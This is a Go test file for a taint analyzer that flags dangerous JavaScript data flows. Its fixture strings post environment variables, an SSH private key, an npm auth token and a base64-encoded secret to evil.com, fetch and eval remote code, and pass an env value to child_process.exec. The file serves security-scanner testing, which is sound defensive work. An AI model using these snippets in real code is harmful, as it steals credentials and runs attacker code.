package analyzer

import (
	"strings"
	"testing"
)

func TestTaintAnalyzer_EnvToFetch(t *testing.T) {
	a := NewTaintAnalyzer()
	content := `
const secrets = process.env;
const data = JSON.stringify(secrets);
fetch('https://evil.com/collect', {method: 'POST', body: data});
`
	findings := a.scanContent(content, "taint1.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Taint") || strings.Contains(f.Title, "taint") || strings.Contains(f.Title, "data flow") {
			found = true
			if f.Severity < SeverityCritical {
				t.Errorf("Expected CRITICAL severity for env-to-network taint, got %v", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected taint flow from process.env to fetch")
	}
}

func TestTaintAnalyzer_FileReadToNetwork(t *testing.T) {
	a := NewTaintAnalyzer()
	content := `
const key = fs.readFileSync('/root/.ssh/id_rsa', 'utf8');
axios.post('https://evil.com/keys', {key: key});
`
	findings := a.scanContent(content, "taint2.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Taint") || strings.Contains(f.Title, "data flow") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected taint flow from fs.readFile to network request")
	}
}

func TestTaintAnalyzer_EnvToExec(t *testing.T) {
	a := NewTaintAnalyzer()
	content := `
const cmd = process.env.COMMAND;
require('child_process').exec(cmd);
`
	findings := a.scanContent(content, "taint3.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Taint") || strings.Contains(f.Title, "data flow") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected taint flow from env to exec")
	}
}

func TestTaintAnalyzer_NetworkToEval(t *testing.T) {
	a := NewTaintAnalyzer()
	content := `
const response = await fetch('https://evil.com/payload');
const code = await response.text();
eval(code);
`
	findings := a.scanContent(content, "taint4.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Taint") || strings.Contains(f.Title, "data flow") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected taint flow from network response to eval")
	}
}

func TestTaintAnalyzer_NpmrcToNetwork(t *testing.T) {
	a := NewTaintAnalyzer()
	content := `
const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const token = npmrc.match(/_authToken=(.+)/)[1];
fetch('https://evil.com/token?t=' + token);
`
	findings := a.scanContent(content, "taint5.js")

	found := false
	for _, f := range findings {
		if f.Severity >= SeverityCritical {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected CRITICAL finding for npmrc token theft taint flow")
	}
}

func TestTaintAnalyzer_NoTaintFlow(t *testing.T) {
	a := NewTaintAnalyzer()
	content := `
const config = require('./config.json');
const app = express();
app.get('/', (req, res) => res.json(config));
app.listen(3000);
`
	findings := a.scanContent(content, "clean.js")

	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity in clean code: %s", f.Title)
		}
	}
}

func TestTaintAnalyzer_BufferToNetwork(t *testing.T) {
	a := NewTaintAnalyzer()
	content := `
const data = Buffer.from(process.env.SECRET);
const encoded = data.toString('base64');
require('https').request({hostname: 'evil.com', path: '/?' + encoded});
`
	findings := a.scanContent(content, "taint6.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Taint") || strings.Contains(f.Title, "data flow") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected taint flow from Buffer.from(env) to network")
	}
}
